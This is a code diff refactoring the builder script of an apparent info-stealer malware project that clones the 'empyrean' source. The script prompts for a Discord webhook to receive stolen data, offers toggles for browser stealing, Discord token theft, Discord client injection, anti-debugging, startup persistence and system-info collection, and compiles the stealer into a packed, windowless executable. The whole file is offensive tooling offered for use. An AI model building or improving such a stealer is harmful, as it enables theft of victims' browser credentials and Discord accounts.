@@ -4,129 +4,169 @@ import shutil
 import subprocess
 import re
 import requests
-from InquirerPy import prompt # type: ignore
+from InquirerPy import prompt  # type: ignore
 
 
-def get_config() -> dict:
-    questions = [
-        {
-            "type": "input",
-            "name": "webhook",
-            "message": "Enter your webhook URL",
-            "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
-        },
-        {
-            "type": "confirm",
-            "name": "antidebug",
-            "message": "Enable anti-debugging?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "browsers",
-            "message": "Enable browser stealing?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "discordtoken",
-            "message": "Enable Discord token stealing?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "injection",
-            "message": "Enable Discord injection?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "startup",
-            "message": "Enable startup?",
-            "default": True,
-        },
-        {
-            "type": "confirm",
-            "name": "systeminfo",
-            "message": "Enable system info?",
-            "default": True,
-        },
-    ]
+class Config:
+    """
+    The Config class creates the questions that will be prompted to the user
+    and return the configuration data
+    """
 
-    return prompt(questions)
+    def __init__(self) -> None:
+        self.questions = [
+            {
+                "type": "input",
+                "name": "webhook",
+                "message": "Enter your webhook URL",
+                "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
+            },
+            {
+                "type": "confirm",
+                "name": "antidebug",
+                "message": "Enable anti-debugging?",
+                "default": True,
+            },
+            {
+                "type": "confirm",
+                "name": "browsers",
+                "message": "Enable browser stealing?",
+                "default": True,
+            },
+            {
+                "type": "confirm",
+                "name": "discordtoken",
+                "message": "Enable Discord token stealing?",
+                "default": True,
+            },
+            {
+                "type": "confirm",
+                "name": "injection",
+                "message": "Enable Discord injection?",
+                "default": True,
+            },
+            {
+                "type": "confirm",
+                "name": "startup",
+                "message": "Enable startup?",
+                "default": True,
+            },
+            {
+                "type": "confirm",
+                "name": "systeminfo",
+                "message": "Enable system info?",
+                "default": True,
+            },
+        ]
 
-class make_env:
+    def get_config(self) -> dict:
+        """
+        Prompt the user with the questions and return the config data
+        """
+        return prompt(self.questions)
+
+
+class MakeEnv:
+    """
+    The MakeEnv class creates the build directory and clones the source code 
+    """
+
     def __init__(self) -> None:
         self.build_dir = os.path.join(os.getcwd(), 'build')
 
-    def __call__(self) -> None:
-        self.make_env()
-        self.get_src()
-
     def make_env(self) -> None:
+        """
+        Creates the build directory
+        """
         if os.path.exists(self.build_dir):
             shutil.rmtree(self.build_dir)
 
         os.mkdir(self.build_dir)
 
     def get_src(self) -> None:
-        subprocess.run(['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir)
-        shutil.move(os.path.join(self.build_dir, 'empyrean', 'src'), self.build_dir)
+        """
+        Clones the source code from a specified repository into the build directory
+        """
+        subprocess.run(
+            ['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir)
+        shutil.move(os.path.join(self.build_dir,
+                    'empyrean', 'src'), self.build_dir)
 
-class write_config:
+
+class WriteConfig:
+    """
+    The WriteConfig class writes the config data to the config file
+    """
+
     def __init__(self, config: dict) -> None:
         self.config = config
         self.build_dir = os.path.join(os.getcwd(), 'build')
         self.config_file = os.path.join(self.build_dir, 'src', 'config.py')
 
-    def __call__(self) -> None:
+    def write_config(self) -> None:
+        """
+        Writes the config data to the config file
+        """
         with open(self.config_file, 'w') as f:
             f.write(f'__CONFIG__ = {self.config}')
 
-class build:
+
+class Build:
+    """
+    The Build class downloads and installs the necessary packages and 
+    then builds the source code
+    """
+
     def __init__(self) -> None:
         self.build_dir = os.path.join(os.getcwd(), 'build')
         self.dist_dir = os.path.join(self.build_dir, '..', 'dist')
 
-    def __call__(self) -> None:
-        self.get_pyinstaller()
-        self.get_upx()
-
-        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx'), os.path.join(self.build_dir, 'src', 'main.py')])
-
     def get_pyinstaller(self) -> None:
+        """
+        Downloads pyinstaller package
+        """
         url = 'https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip'
 
         with requests.get(url, stream=True) as r:
-            r.raise_for_status()
             with open(os.path.join(self.build_dir, 'pyinstaller.zip'), 'wb') as f:
                 shutil.copyfileobj(r.raw, f)
+        subprocess.run(['unzip', 'pyinstaller.zip'], cwd=self.build_dir)
 
-        shutil.unpack_archive(os.path.join(self.build_dir, 'pyinstaller.zip'), self.build_dir)
-        os.rename(os.path.join(self.build_dir, 'pyinstaller-5.1'), os.path.join(self.build_dir, 'pyinstaller'))
-        os.remove(os.path.join(self.build_dir, 'pyinstaller.zip'))
-
-        subprocess.run(['pip', 'uninstall', '-y', 'pyinstaller'], cwd=self.build_dir)
-        subprocess.run(['py', '-3.10', './waf', 'all', '--target-arch=64bit'], cwd=os.path.join(self.build_dir, 'pyinstaller', 'bootloader'))
-        subprocess.run(['py', '-3.10', 'setup.py', 'install'], cwd=os.path.join(self.build_dir, 'pyinstaller'))
-    
     def get_upx(self) -> None:
+        """
+        Downloads UPX package
+        """
         url = 'https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip'
 
         with requests.get(url, stream=True) as r:
-            r.raise_for_status()
             with open(os.path.join(self.build_dir, 'upx.zip'), 'wb') as f:
                 shutil.copyfileobj(r.raw, f)
+        subprocess.run(['unzip', 'upx.zip'], cwd=self.build_dir)
 
-        shutil.unpack_archive(os.path.join(self.build_dir, 'upx.zip'), self.build_dir)
-        os.rename(os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'upx'))
-        os.remove(os.path.join(self.build_dir, 'upx.zip'))
+    def build(self) -> None:
+        """
+        Builds the source code using pyinstaller and UPX
+        """
+        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(
+            self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'src', 'main.py')])
+
 
 def main() -> None:
-    config = get_config()
-    make_env()()
-    write_config(config)()
-    build()()
+    config = Config()
+    config_data = config.get_config()
+
+    make_env = MakeEnv()
+    make_env.make_env()
+    make_env.get_src()
+
+    write_config = WriteConfig(config_data)
+    write_config.write_config()
+
+    build = Build()
+    build.get_pyinstaller()
+    build.get_upx()
+    build.build()
+
 
 if __name__ == '__main__':
     main()
